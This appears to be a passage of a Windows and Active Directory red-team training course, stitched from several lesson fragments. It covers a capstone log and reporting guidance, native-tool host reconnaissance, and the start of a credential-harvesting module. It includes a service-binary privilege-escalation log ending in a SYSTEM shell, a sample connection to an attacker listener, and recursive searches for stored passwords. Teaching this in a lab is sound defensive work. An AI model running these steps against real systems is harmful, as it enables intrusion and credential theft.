O\\user.low\n**Action:** Restarting VulnerableService.\n**Command:** `sc stop VulnerableService` then `sc start VulnerableService`\n**Result:** Service stopped and started successfully. Attacker listener received connection! Got SYSTEM shell.\n**Notes:** PE successful via vulnerable service binary replacement. Now at `NT AUTHORITY\\SYSTEM` on WKSTN1. Proceed to M2/M6 techniques for cred harvesting as SYSTEM.\n---\n</code></pre>\n<p>This level of detail is crucial. It allows you to reconstruct your steps for the report and understand where things went right or wrong.</p>\n<h3>Section 8.4: Post-Operation (Capstone Phase 3)</h3>\n<p>In a real red team engagement, this phase involves:</p>\n<ul>\n<li><strong>Cleanup:</strong> Removing persistence mechanisms, deleting tools/scripts dropped on disk, clearing logs (carefully, and often leaving traces anyway), removing any created accounts or objects.</li>\n<li><strong>Verification:</strong> Double-checking that the objective was definitively met.</li>\n<li><strong>Knowledge Transfer:</strong> Briefing the client defenders (often done as part of the report).</li>\n</ul>\n<p>In your lab Capstone:</p>\n<ul>\n<li><strong>Cleanup:</strong> The easiest way is often to revert your lab VMs to a clean state before the operation. If you created persistence, <em>manually</em> go back and remove it as a practice exercise.</li>\n<li><strong>Verification:</strong> Ensure you have undeniable proof that you achieved your objective (e.g., screenshot of a Domain Admin shell, screenshot accessing the sensitive file share from your compromised path).</li>\n</ul>\n<h3>Section 8.5: Documentation &amp; Reporting (Capstone Phase 4)</h3>\n<p>This is where you synthesize your execution log and findings into a coherent report. A good report is arguably as important as the successful execution itself. It&#39;s how you communicate value and help the defenders improve.</p>\n<h4>8.5.1 Why Good Reporting Matters</h4>\n<ul>\n<li><strong>Communication:</strong> Translates technical actions into understandable impact.</li>\n<li><strong>Actionable Intelligence:</strong> Provides defenders with concrete findings and recommendations to fix vulnerabilities.</li>\n<li><strong>Demonstrates Value:</strong> Shows the client/management what was achieved and the security posture from an attacker&#39;s perspective.</li>\n<li><strong>Knowledge Transfer:</strong> Educates the defense team on attacker TTPs.</li>\n</ul>\n<h4>8.5.2 Target Audiences</h4>\n<ul>\n<li><strong>Executive Summary:</strong> High-level overview for management. Focus on the objective, whether it was achieved, the overall risk demonstrated, and key recommendations. <em>Non-technical language.</em></li>\n<li><strong>Technical Details:</strong> For the security team and system administrators. Detailed steps, specific vulnerabilities, affected systems, tools used, evidence. <em>Technical language.</em></li>\n</ul>\n<h4>8.5.3 Report Structure</h4>\n<p>A standard structure is often used:</p>\n<ol>\n<li><strong>Executive Summary:</strong> (1-2 pages)<ul>\n<li>Objective of the engagement.</li>\n<li>Summary of findings and overall risk.</li>\n<li>Confirmation of whether the objective was met.</li>\n<li>Key recommendations.</li>\n</ul>\n</li>\n<li><strong>Scope and Objectives:</strong><ul>\n<li>Clearly state what was in scope (systems, network ranges).</li>\n<li>Reiterate the specific objectives.</li>\n<li>Mention any RoE or constraints.</li>\n</ul>\n</li>\n<li><strong>Methodology:</strong><ul>\n<li>Briefly describe the approach taken (e.g., simulated initial access, focus on AD environment).</li>\n<li>Mention the phases of the operation (recon, PE, LM, etc.).</li>\n</ul>\n</li>\n<li><strong>Findings:</strong><ul>\n<li>This is the core technical section. Organize logically.</li>\n<li>Common organization methods:<ul>\n<li>By kill chain phase (Recon Findings, PE Findings, LM Findings, etc.)</li>\n<li>By severity (Critical, High, Medium, Low)</li>\n<li>By system/group of systems</li>\n</ul>\n</li>\n<li>For <em>each</em> finding (e.g., &quot;Weak Service Permissions on WKSTN1&quot;, &quot;Kerberoastable User Account&quot;, &quot;Unconstrained Delegation on APP01&quot;):<ul>\n<li><strong>Title:</strong> Clear and concise.</li>\n<li><strong>Description:</strong> Explain the vulnerability/misconfiguration.</li>\n<li><strong>Location:</strong> Where was it found (Host, User, AD Object)?</li>\n<li><strong>Impact:</strong> How could an attacker leverage this? (e.g., &quot;Allows local privilege escalation&quot;, &quot;Grants access to crackable hash&quot;, &quot;Allows impersonation of any service&quot;).</li>\n<li><strong>Proof of Concept/Steps to Reproduce:</strong> This is where your execution log comes in! Detail the steps taken to identify and exploit it. Include commands, relevant output, and screenshots as evidence. <em>Example:</em> &quot;Step 1: Ran `icacls &quot;C:\\Program Files\\Vulnerable</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n\n                </div>\n             </div>\n         "

      "content": "Alright team, let's kick this off! I'm genuinely stoked to guide you through the fascinating world of Windows and Active Directory red teaming. Forget dry lectures; we're here to build practical skills, understand the attacker's perspective, and frankly, have some fun breaking things in a controlled, ethical environment.\r\n\r\nThis first module is our foundational step. Think of it like landing on a new planet – you've arrived (initial access achieved!), but you have *no idea* what's around you. Your immediate goal isn't to conquer the planet, but to figure out: Where are you? What resources are available? Who else is here? What's the lay of the land?\r\n\r\nThat's exactly what initial host reconnaissance is about. We'll focus on using the tools *already present* on the system. Why? Because they're expected, often less noisy than dropping custom binaries, and surprisingly powerful once you know how to wield them.\r\n\r\nLet's dive in!\r\n\r\n---\r\n\r\n## **Module 1: Post-Exploitation Foundations & Initial Host Reconnaissance**\r\n\r\n**Module Objective:** Understand the red team lifecycle's post-exploitation phase and perform comprehensive initial reconnaissance on a compromised Windows host using native tools and fundamental techniques.\r\n\r\n**Alright, so you've got a shell... now what?**\r\n\r\nThis module assumes you've already gained some form of initial access to a Windows machine. This could be anything from an RDP session with stolen credentials, a web shell on a vulnerable application, successful exploitation leading to a reverse shell, or even physical access (though less common in pure \"red team\" simulations unless specified).\r\n\r\nThe *point* is, you are *on* the system, but likely with limited knowledge of your surroundings. This is where the \"Post-Exploitation\" phase begins.\r\n\r\n### **1.1 Revisiting the Red Team/Attack Kill Chain (Focus on Actions on Objective)**\r\n\r\nYou've probably seen variations of the cyber kill chain or attack lifecycle. They generally follow a path:\r\n\r\n1.  **Reconnaissance:** Gathering information about the target *before* interacting with it.\r\n2.  **Weaponization:** Pairing an exploit with a backdoor/payload.\r\n3.  **Delivery:** Getting the weaponized payload to the target (phishing, vulnerable service, etc.).\r\n4.  **Exploitation:** Triggering the vulnerability to run your code.\r\n5.  **Installation:** Establishing a persistent foothold.\r\n6.  **Command and Control (C2):** Communicating with your implanted code.\r\n7.  **Actions on Objective:** *This is where we are right now.* This is the phase where the attacker performs actions to achieve their *actual goal* – whether it's data exfiltration, disruption, gaining domain admin, or something else entirely.\r\n\r\nPost-exploitation *starts* after successful exploitation and often overlaps heavily with Installation, C2, and especially **Actions on Objective**. Our focus in this module is the *very first step* within Actions on Objective on a new host: **understanding the host itself**.\r\n\r\n### **1.2 Understanding the Post-Exploitation Mindset and Goals**\r\n\r\nYou've got a shell. Great! But what can you *do* from here? Your immediate goals on this initial host are typically:\r\n\r\n*   **Confirm your access level:** Are you a standard user, an administrator, SYSTEM? This dictates what you can do next.\r\n*   **Understand the host's role:** Is it a workstation, a server, a domain controller? Is it critical infrastructure?\r\n*   **Identify potential avenues for Privilege Escalation (PE):** If you're a low-privileged user, you *must* find a way to get higher privileges (Administrator/SYSTEM) to do anything significant.\r\n*   **Identify potential avenues for Lateral Movement (LM):** This host is just one point. Where else can you go from here? What other machines does it connect to? What credentials are on this machine that might work elsewhere?\r\n*   **Locate valuable data:** Are there sensitive files, configuration settings, or cached credentials lying around?\r\n*   **Gather intelligence about the environment:** Is this host domain-joined? What domain? Who uses this machine? What software is installed?\r\n*   **Prepare for Persistence:** How can you ensure you regain access if your current shell dies or the machine reboots? (We'll touch on this briefly, but persistence is a deeper topic later).\r\n*   **Maintain Operational Security (OpSec):** How can you do all of this without getting caught? (Crucial, and we'll weave this throughout).\r\n\r\nInitial reconnaissance is about answering these questions using the resources immediately at your disposal.\r\n\r\n### **1.3 Establishing and Maintaining a Stable Foothold (Briefly)**\r\n\r\nAs mentioned, we're assuming initial access is achieved. However, it's worth noting that a stable connection is paramount. A wobbly shell that dies every few minutes is useless. Red teamers use various tools (like Cobalt Strike, Covenant, Metasploit, Empire, etc.) to manage agents or implants that provide reliable command and control.\r\n\r\nFor our lab purposes, you might be using RDP, a simple Netcat shell, or a Metasploit session. Just ensure you have a consistent way to run commands on the target machine.\r\n\r\n### **1.4 Essential Windows Command-Line Interface (CMD) and PowerShell Usage for Reconnaissance**\r\n\r\nWindows offers two primary command-line environments:\r\n\r\n1.  **CMD (`cmd.exe`):** The classic command prompt. It's older, simpler, and command-based. Many fundamental network and system commands are executed here. It's universally available on all Windows versions.\r\n2.  **PowerShell (`powershell.exe`):** A more modern, object-oriented scripting environment. It's significantly more powerful, allows for much deeper interaction with the operating system, WMI, and Active Directory, and is essential for modern Windows offensive operations. It's standard on Windows 7+ and Server 2008 R2+.\r\n\r\n**Why use both?**\r\n\r\n*   CMD commands are sometimes quicker for simple tasks (`ipconfig`, `whoami`).\r\n*   PowerShell is indispensable for complex queries, automation, and interacting with system objects (`Get-Process`, `Get-Service`, WMI queries, AD module).\r\n*   Sometimes defenders monitor one more heavily than the other. Using both can sometimes help stay under the radar, or reveal different types of information.\r\n\r\nFor this module, we'll primarily use PowerShell where available, as it provides richer, more structured data, but we'll cover essential CMD commands too.\r\n\r\n**Getting Started in the Lab:**\r\n\r\nAssume you have a shell (e.g., a Metasploit session, a Netcat listener catching a reverse shell, or an RDP connection). You'll interact with the command line through this session.\r\n\r\n### **1.5 Gathering System Information**\r\n\r\nFirst things first, what kind of machine are we on?\r\n\r\n#### **Using `systeminfo` (CMD)**\r\n\r\nThis command provides a wealth of information about the system configuration.\r\n\r\n```cmd\r\nsysteminfo\r\n```\r\n\r\n**What to look for in the output:**\r\n\r\n*   **OS Name:** (e.g., Microsoft Windows 10 Enterprise, Microsoft Windows Server 2019 Standard) - Tells you the operating system.\r\n*   **OS Version:** (e.g., 10.0.19044 N/A Build 19044) - Specific build number. Useful for identifying known OS vulnerabilities.\r\n*   **OS Configuration:** (e.g., Member Workstation, Standalone Server, Domain Controller) - *Crucial*! Tells you if it's part of a domain and its role.\r\n*   **Registered Owner/Organization:** Sometimes reveals internal naming conventions.\r\n*   **Product ID:** Can sometimes indicate the type of license/install.\r\n*   **Original Install Date:** How old is this system?\r\n*   **System Boot Time:** How long has it been running? (Might indicate recent reboots/patching).\r\n*   **System Manufacturer/Model:** Hardware details.\r\n*   **System Type:** (e.g., x64-based PC) - Architecture (32-bit or 64-bit). Important for payload compatibility.\r\n*   **Domain:** If domain-joined, shows the domain name. **Very important!**\r\n*   **Logon Server:** The DC that authenticated the current user. Useful AD info.\r\n*   **Hotfix(s):** Lists installed patches. Can reveal if specific security patches are missing.\r\n*   **Network Card(s):** Basic info about network interfaces.\r\n\r\n**Example Output Snippet:**\r\n\r\n```\r\nHost Name:                 TARGET-PC\r\nOS Name:                   Microsoft Windows 10 Enterprise\r\nOS Version:                10.0.19044 N/A Build 19044\r\nOS Manufacturer:           Microsoft Corporation\r\nOS Configuration:          Member Workstation\r\nOS Build Type:             Multiprocessor Free\r\nRegistered Owner:          User\r\nRegistered Organization:   LAB\r\nProduct ID:                00000-00000-00000-AA000\r\nOriginal Install Date:     7/15/2023, 11:30:00 AM\r\nSystem Boot Time:          7/15/2023, 2:00:00 PM\r\nSystem Manufacturer:       VMware, Inc.\r\nSystem Model:              VMware Virtual Platform\r\nSystem Type:               x64-based PC\r\nProcessor(s):              1 Processor(s) Installed.\r\n                           [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~2592 Mhz\r\nBIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1907100924, 7/10/2019\r\nWindows Directory:         C:\\WINDOWS\r\nSystem Directory:          C:\\WINDOWS\\system32\r\nBoot Device:               \\Device\\HarddiskVolume1\r\nSystem Locale:             en-us;English (United States)\r\nInput Locale:              en-us;English (United States)\r\nTime Zone:                 (UTC-05:00) Eastern Time (US & Canada)\r\nTotal Physical Memory:     4,095 MB\r\nAvailable Physical Memory: 2,500 MB\r\nVirtual Memory: Max Size:  8,191 MB\r\nVirtual Memory: Available: 6,300 MB\r\nVirtual Memory: In Use:    1,891 MB\r\nPage File Location(s):     C:\\pagefile.sys\r\nDomain:                    LAB.LOCAL\r\nLogon Server:              \\\\DC01.LAB.LOCAL\r\nHotfix(s):                 8 Hotfix(s) Installed.\r\n                           [01]: KB456xxxxx\r\n                           [02]: KB457xxxxx\r\n                           ...\r\nNetwork Card(s):           1 Card(s) Installed.\r\n                           [01]: Intel(R) 82574L Gigabit Network Connection\r\n                                 Connection Name: Ethernet0\r\n                                 DHCP Enabled:    Yes\r\n                                 IP address(es)\r\n                                 [01]: 192.168.1.150\r\n```\r\n\r\n#### **Using Registry Queries**\r\n\r\nThe Windows Registry is a central database for configuration. You can extract OS version information directly from here.\r\n\r\n```cmd\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuild\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMajorVersionNumber\r\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMinorVersionNumber\r\n```\r\n\r\n**Explanation:**\r\n\r\n*   `reg query`: The command to query the registry.\r\n*   `\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\"`: The key path containing OS version info.\r\n*   `/v ProductName`: Specifies the value name (e.g., \"Windows 10 Enterprise\").\r\n*   `/v CurrentBuild`: Specifies the build number (e.g., \"19044\").\r\n*   `/v CurrentMajorVersionNumber`, `/v CurrentMinorVersionNumber`: More specific version numbers.\r\n\r\n**Why use Registry?** It's another way to get the info, sometimes useful if `systeminfo` is blocked or for scripting. It also introduces interacting with the registry, which is vital for other post-exploitation tasks (like persistence).\r\n\r\n### **1.6 Enumerating Users, Groups, and Sessions**\r\n\r\nWho uses this machine? What are their privileges? Who is currently logged in?\r\n\r\n#### **Using `whoami` (CMD)**\r\n\r\nSimple, but essential first step. Tells you the user and domain/hostname you are currently operating as.\r\n\r\n```cmd\r\nwhoami\r\n```\r\n\r\n**Output:**\r\n\r\n```\r\nlab\\user1\r\n```\r\nor\r\n```\r\ntarget-pc\\administrator\r\n```\r\n\r\nThis immediately tells you if you are a local user or a domain user, and your username.\r\n\r\n#### **Using `query user` (CMD)**\r\n\r\nLists users currently logged into the system (primarily via RDP or console session).\r\n\r\n```cmd\r\nquery user\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\n USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\r\n>user1                 rdp-tcp#0           0  Active          3  7/15/2023 2:05 PM\r\n administrator         console             1  Active         none  7/15/2023 1:55 PM\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   **USERNAME:** Other users logged in. Are any of them administrators? Domain Admins?\r\n*   **SESSIONNAME:** Type of session (console, rdp-tcp).\r\n*   **STATE:** Active, Disconnected. Active sessions might be hijackable later (advanced topic).\r\n*   **IDLE TIME:** How long has the session been idle?\r\n\r\n**Why is this important?** Identifying other active users, especially privileged ones, is a key step for potential credential harvesting or session hijacking (M2, M4).\r\n\r\n#### **Using `net user` (CMD)**\r\n\r\nEnumerates local users on the machine.\r\n\r\n```cmd\r\nnet user\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\nUser accounts for \\\\TARGET-PC\r\n\r\n-------------------------------------------------------------------------------\r\nAdministrator           Guest                   user1\r\nWDAGUtilityAccount      DefaultAccount\r\nThe command completed successfully.\r\n```\r\n\r\nTo get details about a specific user:\r\n\r\n```cmd\r\nnet user <username>\r\n```\r\n\r\n**Example:**\r\n\r\n```cmd\r\nnet user administrator\r\n```\r\n\r\n**Output Snippet (for Administrator user):**\r\n\r\n```\r\nUser name                     Administrator\r\nFull Name\r\nComment                       Built-in account for administering the computer/domain\r\n...\r\nAccount active                Yes\r\nAccount expires               Never\r\nPassword last set             7/10/2023 10:00:00 AM\r\nPassword expires              Never\r\nPassword changeable           7/10/2023 10:00:00 AM\r\n...\r\nLocal Group Memberships       *Administrators\r\nGlobal Group memberships      *None\r\n...\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   List of users: Identify potential targets.\r\n*   Details of specific users: When was the password last set? Is the account active? What groups do they belong to? (Local Group Memberships is key here).\r\n\r\n**Why is this important?** You need to know which accounts exist locally. Identifying local administrators is critical for privilege escalation.\r\n\r\n#### **Using `net localgroup` (CMD)**\r\n\r\nEnumerates local groups and their members.\r\n\r\n```cmd\r\nnet localgroup\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\nAliases for \\\\TARGET-PC\r\n\r\n-------------------------------------------------------------------------------\r\n*Administrators\r\n*Backup Operators\r\n*Guests\r\n*Remote Desktop Users\r\n*Users\r\n...\r\nThe command completed successfully.\r\n```\r\n\r\nTo see members of a specific group (most importantly, `Administrators`):\r\n\r\n```cmd\r\nnet localgroup administrators\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\nAlias name     Administrators\r\nComment        Administrators have complete and unrestricted access to the computer/domain\r\n\r\nMembers\r\n\r\n-------------------------------------------------------------------------------\r\nAdministrator\r\nLAB\\Domain Admins\r\nuser1\r\nThe command completed successfully.\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   Which accounts are members of the `Administrators` group? This is your primary target for local privilege escalation.\r\n*   Which accounts are in `Remote Desktop Users`? They can RDP in.\r\n*   Other interesting groups like `Backup Operators` (can read many files), `Remote Management Users`, etc.\r\n\r\n**Why is this important?** Explicitly identifies which users or groups have administrative privileges on this specific machine. Knowing `LAB\\Domain Admins` is a member of the local `Administrators` group on this workstation is a *huge* finding for lateral movement towards domain dominance.\r\n\r\n#### **Using PowerShell for Users and Groups (More Detail)**\r\n\r\nPowerShell cmdlets often provide more structured and detailed output.\r\n\r\n```powershell\r\nGet-LocalUser\r\nGet-LocalGroup\r\nGet-LocalGroupMember -Group \"Administrators\"\r\n```\r\n\r\nThese cmdlets are available on newer Windows versions (Windows 10, Server 2016+). For older versions or domain users/groups (which we'll cover in Module 5), you'd use WMI or the ActiveDirectory module.\r\n\r\n**Example using `Get-LocalGroupMember`:**\r\n\r\n```powershell\r\nGet-LocalGroupMember -Group \"Administrators\" | Select-Object Name, PrincipalSource\r\n```\r\n\r\n**Output Example:**\r\n\r\n```\r\nName                 PrincipalSource\r\n----                 ---------------\r\nTARGET-PC\\Administrator Local\r\nLAB\\Domain Admins    ActiveDirectory\r\nTARGET-PC\\user1      Local\r\n```\r\n\r\n**Why use PowerShell?** The output is object-based, making it much easier to filter, sort, and export data for scripting and automation. `PrincipalSource` clearly tells you if the member is a local account or a domain account.\r\n\r\n### **1.7 Identifying Running Processes and Services**\r\n\r\nWhat software is running? Are there any security products? Any unusual processes?\r\n\r\n#### **Using `tasklist` (CMD)**\r\n\r\nLists currently running processes.\r\n\r\n```cmd\r\ntasklist\r\n```\r\n\r\n**Output Snippet:**\r\n\r\n```\r\nImage Name                     PID Session Name        Session#    Mem Usage\r\n========================= ======== ================ =========== ============\r\nSystem Idle Process              0 Services                   0         8 KB\r\nSystem                           4 Services                   0       184 KB\r\n...\r\nmsmpeng.exe                   1234 Services                   0     150,000 KB  <-- Windows Defender\r\nSearchIndexer.exe             5678 Services                   0      50,000 KB\r\n...\r\ncmd.exe                       9876 rdp-tcp#0                  0       3,000 KB  <-- Your command prompt!\r\npowershell.exe               10112 rdp-tcp#0                  0     100,000 KB\r\n...\r\n```\r\n\r\nTo see services hosted within processes:\r\n\r\n```cmd\r\ntasklist /svc\r\n```\r\n\r\nTo see process details including the full path:\r\n\r\n```cmd\r\ntasklist /v\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   **Security Software:** Processes like `msmpeng.exe` (Windows Defender), `sophos*.exe`, `McAfee*.exe`, `agent.exe` (endpoint agents). Knowing what security is running helps plan evasion.\r\n*   **Unusual Processes:** Anything with a strange name, running from a weird directory (`C:\\Users\\Public\\temp\\malware.exe`), or consuming excessive resources.\r\n*   **Processes running as SYSTEM:** These are high-privilege processes.\r\n*   **Processes with network connections:** Cross-reference with `netstat` output.\r\n\r\n**Why is this important?** Helps identify security controls, potential targets for injection or manipulation, and reveals what the user or system is actively doing.\r\n\r\n#### **Using `Get-Process` (PowerShell)**\r\n\r\nProvides more detailed information about processes.\r\n\r\n```powershell\r\nGet-Process\r\n```\r\n\r\n**Example:** Get details for a specific process name:\r\n\r\n```powershell\r\nGet-Process -Name \"explorer\"\r\n```\r\n\r\n**Example:** Get processes owned by a specific user (requires admin privileges usually):\r\n\r\n```powershell\r\nGet-Process | Where-Object { $_.Owner -eq \"LAB\\user1\" }\r\n```\r\n\r\n**Example:** Get processes and their full path:\r\n\r\n```powershell\r\nGet-Process | Select-Object ProcessName, Path\r\n```\r\n\r\n**Why use PowerShell?** Object-based output allows for powerful filtering and analysis. You can easily find processes based on owner, path, CPU usage, etc.\r\n\r\n#### **Using `Get-Service` (PowerShell)**\r\n\r\nLists installed services and their status.\r\n\r\n```powershell\r\nGet-Service\r\n```\r\n\r\n**Example:** List only running services:\r\n\r\n```powershell\r\nGet-Service | Where-Object { $_.Status -eq \"Running\" }\r\n```\r\n\r\n**Example:** Get details for a specific service:\r\n\r\n```powershell\r\nGet-Service -Name \"Spooler\" # The Print Spooler service, often targeted\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   **Running Services:** What functionality is enabled?\r\n*   **Disabled Services:** Are any critical security services disabled?\r\n*   **Services running as SYSTEM or specific users:** Potential targets for privilege escalation if misconfigured (covered in M3).\r\n*   **Unusual Service Names:** Could indicate malware or custom applications.\r\n\r\n**Why is this important?** Services are often long-running processes that start at boot. Misconfigured services are a classic privilege escalation vector. Identifying security services helps understand defenses.\r\n\r\n### **1.8 Mapping Network Connections and Configuration**\r\n\r\nHow is this machine connected? What other machines is it talking to?\r\n\r\n#### **Using `ipconfig` (CMD)**\r\n\r\nDisplays current TCP/IP network configuration values.\r\n\r\n```cmd\r\nipconfig /all\r\n```\r\n\r\n**Output Snippet:**\r\n\r\n```\r\nWindows IP Configuration\r\n\r\n   Host Name . . . . . . . . . . . . : TARGET-PC\r\n   Primary Dns Suffix  . . . . . . . : lab.local\r\n   Node Type . . . . . . . . . . . . : Hybrid\r\n   IP Routing Enabled. . . . . . . . : No\r\n   WINS Proxy Enabled. . . . . . . . : No\r\n   DNS Suffix Search List. . . . . . : lab.local\r\n\r\nEthernet adapter Ethernet0:\r\n\r\n   Connection-specific DNS Suffix  . :\r\n   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection\r\n   Physical Address. . . . . . . . . : 00-50-56-XX-YY-ZZ\r\n   DHCP Enabled. . . . . . . . . . . : Yes\r\n   Autoconfiguration Enabled . . . . : Yes\r\n   IPv4 Address. . . . . . . . . . . : 192.168.1.150(Preferred)\r\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\r\n   Lease Obtained. . . . . . . . . . : Monday, July 15, 2023 2:00:00 PM\r\n   Lease Expires . . . . . . . . . . : Tuesday, July 16, 2023 2:00:00 PM\r\n   Default Gateway . . . . . . . . . : 192.168.1.1\r\n   DHCP Server . . . . . . . . . . . : 192.168.1.1\r\n   DNS Servers . . . . . . . . . . . : 192.168.1.10  <-- Often the Domain Controller!\r\n                                       8.8.8.8\r\n   NetBIOS over Tcpip. . . . . . . . : Enabled\r\n```\r\n\r\n**What to look for:**\r\n\r\n*   **IP Address(es):** What network segment are you on? Can you reach other segments?\r\n*   **Subnet Mask:** Helps define the local network.\r\n*   **Default Gateway:** The router. Often the first hop to other networks.\r\n*   **DNS Servers:** **Crucial!** In a domain, the primary DNS server is almost always a Domain Controller. This immediately tells you the IP address of a DC.\r\n*   **Domain Name:** Confirms the domain from `systeminfo`.\r\n\r\n**Why is this important?** Understanding the network configuration is fundamental for planning lateral movement. Identifying the DC via DNS server listing is a primary way to locate domain infrastructure.\r\n\r\n#### **Using `netstat` (CMD)**\r\n\r\nDisplays active TCP connections, ports on which the computer is listening, Ethernet statistics, the IP routing table, and IPv6 statistics.\r\n\r\n```cmd\r\nnetstat -ano\r\n```\r\n\r\n**Explanation of flags:**\r\n\r\n*   `-a`: Displays all active TCP connections and the TCP and UDP ports on which the computer is listening.\r\n*   `-n`: Displays active TCP connections, however, addresses and port numbers are expressed numerically and no attempt is made to determine names. Much faster.\r\n*   `-o`: Displays active TCP connections and includes the process ID (PID) for each connection. This is *very* useful.\r\n\r\n**Output Snippet:**\r\n\r\n```\r\nActive Connections\r\n\r\n  Proto  Local Address          Foreign Address        State           PID\r\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       848   <-- RPC Endpoint Mapper\r\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4     <-- SMB (File Sharing)\r\n  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1236  <-- RDP\r\n  TCP    192.168.1.150:49870    192.168.1.1:53         ESTABLISHED     1152  <-- DNS query to gateway/DC\r\n  TCP    192.168.1.150:49871    192.168.1.10:389       ESTABLISHED     9988  <-- LDAP query to DC (192.168.1.10)\r\n  TCP    192.168.1.150:49872    192.168.1.200:445      ESTABLISHED     4     <-- SMB connection to another host (192.168.1.200)\r\n  TCP    192.168.1.150:50000    YOUR_ATTACKER_IP:4444"

      "content": "Alright, team! Welcome back to the deep dive. Module 1 got our feet wet, establishing a basic foothold and getting our bearings on a target Windows host using native tools. We learned *how* to look around.\r\n\r\nNow, in Module 2, we shift gears. We're not just looking around passively anymore; we're actively searching for the *good stuff*. This means digging deeper into the local system to find valuable information, uncovering potential weaknesses we might exploit later (hello, Module 3!), and, perhaps most importantly, finding those precious credentials that can unlock doors to other systems or higher privileges.\r\n\r\nThis is where the post-exploitation phase really starts to pay dividends. Local enumeration gives us context and potential attack vectors, and credential harvesting often provides the keys to the kingdom, or at least the keys to the next room.\r\n\r\nLet's get our hands dirty!\r\n\r\n---\r\n\r\n**Module 2: Local Enumeration & Credential Harvesting**\r\n\r\n**Module Objective:** Identify valuable local information, uncover potential weaknesses, and extract cached or stored credentials from a compromised Windows host.\r\n\r\nBy the end of this module, you will be able to systematically enumerate a Windows host for sensitive files, installed software, system configurations, and critical credential storage locations. You will understand the *why* behind targeting LSASS and registry hives, and perform practical steps (in a lab!) to extract credentials, setting the stage for privilege escalation and lateral movement.\r\n\r\n---\r\n\r\n### **2.1: The Post-Exploitation Mindset: Digging Deeper**\r\n\r\nIn Module 1, we were like tourists getting off the plane – looking at the major landmarks (`systeminfo`, `ipconfig`, `net user`). Now, we're residents exploring the hidden alleys, checking basements, and looking under floorboards.\r\n\r\nOur goals in this deeper phase are:\r\n\r\n1.  **Gain Context:** Understand the *specific* role of this machine. Is it a user workstation? A server? What applications run here? Who uses it?\r\n2.  **Find Local Weaknesses:** Identify misconfigurations or vulnerabilities unique to *this* host that could allow us to elevate privileges locally (more on this in M3).\r\n3.  **Discover Sensitive Data:** Locate files containing passwords, API keys, configuration strings, sensitive documents, etc.\r\n4.  **Harvest Credentials:** Extract cached passwords, hashes, or Kerberos tickets stored in memory or on disk. **This is often the fastest way to move forward.**\r\n\r\nWe'll still rely heavily on our command-line friends (CMD and PowerShell), but we'll also introduce the *types* of specialized tools used by red teamers and attackers (and defenders!) to automate and facilitate these tasks.\r\n\r\n### **2.2: In-Depth Local File System Enumeration**\r\n\r\nThe file system is a treasure trove. Users save things where they shouldn't, applications store configurations insecurely, and scripts might contain hardcoded credentials. Our job is to search intelligently.\r\n\r\n**Why Search the File System?**\r\n\r\n*   **Configuration Files:** Applications (databases, web servers, custom tools) often store connection strings, API keys, or passwords in XML, INI, CONFIG, or TXT files.\r\n*   **Scripts:** PowerShell (.ps1), Batch (.bat, .cmd), Python (.py), etc., scripts might contain hardcoded credentials for automation purposes.\r\n*   **User Profiles:** Desktop, Documents, Downloads, AppData directories often contain cached files, browser history, saved RDP connection files, password manager databases (though hopefully encrypted!), and other sensitive user data.\r\n*   **Application Data:** Specific application folders (e.g., `C:\\Program Files`, `C:\\Program Files (x86)`) might contain configuration files or logs of interest.\r\n*   **Temporary Directories:** Sometimes sensitive data or temporary credential files are left behind in `%TEMP%`.\r\n\r\n**Techniques & Commands:**\r\n\r\nWe'll primarily use PowerShell for its power and flexibility in navigating and searching the file system.\r\n\r\n*   **Basic Directory Listing (Recurse):**\r\n    ```powershell\r\n    Get-ChildItem -Path C:\\Users -Recurse -ErrorAction SilentlyContinue\r\n    ```\r\n    *   `Get-ChildItem`: Equivalent of `dir`.\r\n    *   `-Path C:\\Users`: Specifies where to start. User profiles are critical.\r\n    *   `-Recurse`: Goes into subdirectories. Be aware this can be *very* slow and generate a lot of output on large file systems.\r\n    *   `-ErrorAction SilentlyContinue`: Suppresses errors for paths we don't have permission to access, keeping the output clean.\r\n\r\n*   **Searching for Specific File Extensions:** We can filter the recursive listing for files that commonly store credentials or configuration.\r\n    ```powershell\r\n    Get-ChildItem -Path C:\\ -Recurse -Include *.config,*.xml,*.ini,*.txt,*.ps1,*.bat,*.cmd,*.py,*.kdbx,*.rdp -ErrorAction SilentlyContinue\r\n    ```\r\n    *   `-Include`: Specifies file patterns to include. Note: `-Include` *requires* `-Recurse` and a wildcard (`*`) in the `-Path` if searching the root, but the above is a common way to use it starting from a specific path like `C:\\`. A simpler way is to specify the path more broadly if needed, but the above is generally effective.\r\n\r\n*   **Searching File Contents (Grepping):** Once we find interesting files, or even across many files, we can search their *contents* for keywords. PowerShell's `Select-String` is powerful for this.\r\n    ```powershell\r\n    # Example 1: Search all .txt files in C:\\ for the word \"password\"\r\n    Get-ChildItem -Path C:\\ -Recurse -Filter \"*.txt\" -ErrorAction SilentlyContinue | Select-String \"password\"\r\n\r\n    # Example 2: Search specific config files found earlier for \"credential\" or \"pass\" (case-insensitive)\r\n    Get-ChildItem -Path C:\\Users\\SpecificUser\\AppData\\Roaming\\MyApp\\config.xml, C:\\Program Files\\AnotherApp\\settings.ini | Select-String -Pattern 